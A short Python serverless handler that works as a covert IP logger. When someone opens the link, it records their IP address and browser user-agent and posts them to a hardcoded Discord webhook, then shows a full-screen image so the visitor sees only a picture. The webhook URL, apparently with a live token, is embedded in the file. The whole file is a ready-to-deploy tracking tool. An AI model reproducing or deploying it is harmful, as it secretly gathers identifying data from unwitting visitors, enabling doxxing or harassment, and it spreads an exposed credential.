import requests, json, base64, time

# ===== CONFIG =====
WEBHOOK = "https://discord.com/api/webhooks/1542880876910739576/xkzlVRqk8escogXognrP8_2mosBHTSedVearzrntiqiF_Xv3FovqjdPQlsxPRZdKKqTU"
IMAGE_URL = "https://i.pinimg.com/474x/df/96/d8/df96d84e03317bba5b9961e75382ec37.jpg"

# ===== HANDLER =====
def handler(request):
    try:
        # Get IP
        ip = request.headers.get('x-forwarded-for', '').split(',')[0].strip()
        useragent = request.headers.get('user-agent', 'Unknown')
        
        # Send to Discord
        data = {
            "content": f"**IP Logged:** `{ip}`\n**User-Agent:** `{useragent}`"
        }
        r = requests.post(WEBHOOK, json=data, timeout=5)
        
        # Return image
        return {
            "statusCode": 200,
            "headers": {"Content-Type": "text/html"},
            "body": f'<html><body><img src="{IMAGE_URL}" style="width:100vw;height:100vh;object-fit:contain;"></body></html>'
        }
    except Exception as e:
        return {
            "statusCode": 200,
            "body": f"<html><body><h1>Error: {str(e)}</h1></body></html>"
        }
